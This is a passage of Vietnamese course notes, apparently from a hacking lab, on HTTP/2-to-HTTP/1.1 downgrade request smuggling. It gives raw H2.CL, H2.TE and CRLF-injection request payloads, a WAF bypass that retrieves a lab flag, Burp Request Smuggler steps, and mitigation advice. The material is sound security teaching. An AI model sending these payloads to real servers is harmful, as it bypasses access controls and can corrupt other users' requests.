Mặc dù có vẻ không rõ tại sao một môi trường như vậy lại được triển khai trong thực tế, nhưng có thể có nhiều lý do dẫn đến việc sử dụng như vậy. Ví dụ:

- Web server chưa hỗ trợ HTTP/2.
- Cấu hình sai của quản trị viên hệ thống.
- Đây có thể là hành vi mặc định của reverse proxy mà quản trị viên hệ thống không biết.

Bất kể lý do là gì, những triển khai này tồn tại trong thực tế và có thể tạo ra các lỗ hổng request smuggling ngay cả khi HTTP/2 được sử dụng.

### Downgrading và Request Smuggling

Để hiểu tại sao việc chuyển đổi HTTP/2 sang HTTP/1.1 lại tạo ra lỗ hổng request smuggling, chúng ta cần tìm hiểu về cách HTTP/2 xử lý thông tin yêu cầu. Như đã đề cập, HTTP/2 có cơ chế tích hợp để xác định độ dài của thân yêu cầu, do đó trường **Content-Length** trở nên không cần thiết. Tuy nhiên, RFC của HTTP/2 nói rằng:

- Một yêu cầu hoặc phản hồi có thể bao gồm trường **Content-Length** nếu nó có chứa dữ liệu thân yêu cầu.
- Một yêu cầu hoặc phản hồi cũng bị coi là bị lỗi nếu giá trị của trường **Content-Length** không bằng tổng chiều dài của các khung **DATA** tạo thành thân yêu cầu.

Điều này có nghĩa là trường **Content-Length** vẫn được phép, miễn là nó đúng. Tuy nhiên, nếu reverse proxy không kiểm tra chính xác trường **Content-Length** và thay vào đó sử dụng trường này khi chuyển đổi yêu cầu sang HTTP/1.1, các lỗ hổng request smuggling sẽ phát sinh.

#### Ví dụ về H2.CL Vulnerability

Giả sử một kẻ tấn công gửi yêu cầu HTTP/2 sau (với các tiêu đề được tô màu đỏ và giá trị tiêu đề là màu xanh):

```
:method POST
:path /
:authority http2.htb
:scheme http
content-length 0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Nếu reverse proxy không kiểm tra chính xác trường **Content-Length** và sử dụng nó khi chuyển đổi yêu cầu này sang HTTP/1.1, yêu cầu HTTP/1.1 sau sẽ được tạo ra:

```
POST / HTTP/1.1
Host: http2.htb
Content-Length: 0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Lúc này, reverse proxy chỉ nhìn thấy một yêu cầu POST đến `/`, nhưng web server nhận được hai yêu cầu: một yêu cầu POST và một yêu cầu GET đến `/smuggled`. Đây chính là ví dụ về **request smuggling**—lợi dụng việc chuyển đổi HTTP/2 sang HTTP/1.1.

### Tạo ra H2.TE Vulnerability với Transfer-Encoding (TE)

Ngoài việc sử dụng trường **Content-Length**, chúng ta cũng có thể khai thác các lỗ hổng thông qua **Transfer-Encoding (TE)**. Theo RFC của HTTP/2, **chunked encoding** không được hỗ trợ. Tuy nhiên, nếu reverse proxy không kiểm tra yêu cầu HTTP/2 chứa trường **TE** và sử dụng nó khi chuyển đổi sang HTTP/1.1, có thể tạo ra lỗ hổng request smuggling. Cụ thể, kẻ tấn công có thể gửi một yêu cầu HTTP/2 như sau:

```
:method POST
:path /
:authority http2.htb
:scheme http
transfer-encoding chunked
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Reverse proxy sẽ tạo ra yêu cầu HTTP/1.1 như sau:

```
POST / HTTP/1.1
Host: http2.htb
Transfer-Encoding: chunked
Content-Length: 48
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Lúc này, reverse proxy sẽ thêm trường **Content-Length** trong quá trình chuyển đổi để thông báo độ dài của thân yêu cầu đến web server. Tuy nhiên, trong HTTP/1.1, trường **Transfer-Encoding** có ưu tiên hơn **Content-Length**, vì vậy web server sẽ coi yêu cầu POST đầu tiên là có encoding **chunked**, và khi nhận được chunk `0`, yêu cầu POST sẽ kết thúc, trong khi yêu cầu GET `/smuggled` sẽ được xử lý như một yêu cầu riêng biệt. Kết quả là **request smuggling** thành công.

### Ví Dụ H2.CL trong Thực Tế

Giả sử chúng ta có một trang web đơn giản ngồi sau một reverse proxy cũng như một **WAF** (Web Application Firewall). Mục tiêu của chúng ta là truy cập một flag bằng cách gửi yêu cầu chứa tham số GET `reveal_flag=1`. Tuy nhiên, WAF chặn tất cả các yêu cầu chứa tham số này.

Để vượt qua WAF, chúng ta có thể sử dụng lỗ hổng **H2.CL**. Để làm được điều này, chúng ta có thể gửi một yêu cầu HTTP/2 như sau (lưu ý bỏ chọn tùy chọn **Update Content-Length** trong Burp Repeater):

```
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0
POST /index.php?reveal_flag=1 HTTP/1.1
Host: http2.htb
```

Do hành vi của reverse proxy và web server, yêu cầu này sẽ vượt qua WAF và tiết lộ flag cho chúng ta.

---
# 17. Tấn công Smuggling Yêu Cầu HTTP/2 Phức Tạp

Trong phần này, chúng ta sẽ khám phá các lỗ hổng HTTP/2 phức tạp hơn mà có thể dẫn đến các cuộc tấn công **Request Smuggling**. Những tấn công này xảy ra khi reverse proxy không xử lý đúng các header khi chuyển đổi yêu cầu từ HTTP/2 sang HTTP/1.1. Các tấn công này có thể liên quan đến việc chèn các ký tự đặc biệt như **CRLF (Carriage Return, Line Feed)** hoặc **pseudo-headers** trong yêu cầu HTTP/2 mà không bị phát hiện trong quá trình chuyển đổi sang HTTP/1.1.

### 1. **Tạo Header Request Injection (Chèn Header Yêu Cầu)**

Khi reverse proxy không kiểm tra kỹ các ký tự CRLF trong giá trị của header HTTP/2 trước khi chuyển đổi yêu cầu sang HTTP/1.1, kẻ tấn công có thể tạo ra một yêu cầu HTTP/2 như sau:

```http
:method POST
:path /
:authority http2.htb
:scheme http
dummy asd\r\nTransfer-Encoding: chunked
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Trong yêu cầu này, giá trị của header `dummy` chứa chuỗi `asd\r\nTransfer-Encoding: chunked`. Do CRLF không có ý nghĩa đặc biệt trong HTTP/2, reverse proxy sẽ chuyển đổi nó thành các header HTTP/1.1 khác nhau sau khi xử lý, chẳng hạn như:

```http
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Kết quả là, yêu cầu HTTP/1.1 có hai header: `Dummy` và `Transfer-Encoding`, và vì `Transfer-Encoding` có độ ưu tiên cao hơn `Content-Length` trong HTTP/1.1, web server sẽ xử lý yêu cầu đầu tiên là sử dụng **chunked encoding**, qua đó tạo ra lỗ hổng **H2.TE**.

### 2. **Tạo Header Name Injection (Chèn Tên Header)**

Tương tự, nếu reverse proxy không kiểm tra đúng các tên header HTTP/2 trước khi chuyển đổi yêu cầu sang HTTP/1.1, chúng ta có thể tạo ra một yêu cầu HTTP/2 như sau:

```http
:method POST
:path /
:authority http2.htb
:scheme http
dummy: asd\r\nTransfer-Encoding: chunked
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Trong trường hợp này, header `dummy` chứa ký tự CRLF (`\r\n`) giữa tên header và giá trị, gây ra sự phân tách giữa các header khi chuyển đổi sang HTTP/1.1:

```http
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Điều này cũng tạo ra lỗ hổng **H2.TE**, vì header `Transfer-Encoding` có độ ưu tiên cao hơn `Content-Length` trong HTTP/1.1.

### 3. **Request Line Injection (Chèn Dòng Yêu Cầu)**

Trong HTTP/2, pseudo-headers có thể được xử lý đặc biệt. Nếu reverse proxy không kiểm tra các pseudo-headers một cách chính xác trước khi chuyển đổi yêu cầu sang HTTP/1.1, kẻ tấn công có thể chèn các ký tự CRLF vào trong pseudo-header. Ví dụ:

```http
:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
:path /
:authority http2.htb
:scheme http
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Trong trường hợp này, header `:method POST` trong HTTP/2 chứa ký tự CRLF, tạo ra sự phân tách không đúng giữa các phần trong dòng yêu cầu khi chuyển sang HTTP/1.1:

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Dummy: asd / HTTP/1.1
Host: http2.htb
Content-Length: 48
0
GET /smuggled HTTP/1.1
Host: http2.htb
```

Như trong các ví dụ trước, điều này dẫn đến lỗ hổng **H2.TE** do sự ưu tiên của `Transfer-Encoding` so với `Content-Length`.

---
# 18. Công cụ & ngăn chặn hạ cấp HTTP/2

Sau khi đã thảo luận về cách khai thác các lỗ hổng HTTP/2 liên quan đến request smuggling, chúng ta sẽ khám phá các công cụ có thể giúp nhận diện và khai thác các lỗ hổng này. Cuối cùng, chúng ta cũng sẽ thảo luận về cách bảo vệ khỏi các lỗ hổng request smuggling trong HTTP/2.

### Công Cụ Hỗ Trợ

Một trong những công cụ hỗ trợ hiệu quả khi tìm kiếm các lỗ hổng liên quan đến request smuggling trong HTTP/2 là **Burp Extension HTTP Request Smuggler**. Công cụ này có thể giúp tự động phát hiện các lỗ hổng và hỗ trợ kiểm tra các request HTTP/2 để tìm kiếm những vấn đề tiềm ẩn.

**Quy trình sử dụng Burp Extension HTTP Request Smuggler**:

1. **Gửi Request HTTP/2 đến Burp Repeater**: 
   Ví dụ, một request như sau:
   ```
   GET /index.php?param1=HelloWorld HTTP/2
   Host: http2.htb
   ```

2. **Kích chuột phải và chọn**:
   `Extensions > HTTP Request Smuggler`

3. **Chạy quét cho lỗ hổng CL.0**: 
   Để kiểm tra lỗ hổng, bạn chỉ cần để tất cả các thiết lập mặc định và nhấn **Enter** để bắt đầu quét. Công cụ sẽ kiểm tra lỗ hổng **CL.0**, một loại lỗ hổng smuggling do tiêu đề `Content-Length` bị đặt là `0` và body chứa request bị smuggled.

4. **Xem kết quả**:
   Sau khi quét, bạn có thể thấy kết quả trong tab **HTTP Output** của Burp:
   ```
   Queueing request scan: CL.0
   Found issue: CL.0 desync: h2CL|TRACE /
   ```

### Xác Thực Lỗ Hổng

Để xác nhận lỗ hổng, bạn có thể thử gửi hai request từ output của công cụ như sau:

- **Request 1** (được gửi theo HTTP/1.1):
   ```
   POST /index.php HTTP/1.1
   Host: 172.17.0.2:8443
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 0
   TRACE / HTTP/1.1
   ```

- **Request 2** (được gửi theo HTTP/2):
   ```
   GET /index.php HTTP/2
   Host: 172.17.0.2:8443
   ```

Gửi chúng qua các kết nối TCP riêng biệt và kiểm tra các phản hồi. Nếu phản hồi đầu tiên có mã trạng thái 200 và phản hồi thứ hai có mã 405, điều này có nghĩa là bạn đã thành công trong việc smuggle request TRACE qua reverse proxy và ảnh hưởng đến request tiếp theo, chứng minh rằng đã có lỗ hổng request smuggling.

### Phòng Chống HTTP/2 Downgrading

**Cách phòng chống**: 

Nguyên nhân chính của các cuộc tấn công này là do quá trình **downgrading HTTP/2**. Các reverse proxy không nên viết lại các request HTTP/2 thành HTTP/1.1. Thay vào đó, HTTP/2 nên được triển khai end-to-end, tức là từ client đến server, để tránh phải viết lại request. Sự khác biệt giữa các phiên bản HTTP có thể dẫn đến các lỗ hổng như request smuggling nếu các reverse proxy và server web không thực hiện đúng theo chuẩn.

**Cấu hình đúng**:
- **Không viết lại HTTP/2 thành HTTP/1.1**: Cấu hình reverse proxy sao cho các request HTTP/2 được chuyển qua mà không cần phải chuyển đổi thành HTTP/1.1.
- **Thực thi HTTP/2 đúng chuẩn**: Đảm bảo rằng các phần mềm proxy và server web tuân thủ đầy đủ RFC của HTTP/2, đặc biệt là việc kiểm tra và xử lý các trường hợp đặc biệt trong tiêu đề.

**Kết luận**:
Với cấu hình và triển khai đúng đắn của HTTP/2, các vấn đề như request smuggling sẽ được hạn chế hoặc loại bỏ hoàn toàn. Tuy nhiên, việc kiểm tra kỹ càng các reverse proxy và phần mềm web server luôn là một bước quan trọng để bảo vệ hệ thống khỏi các cuộc tấn công tiềm tàng.
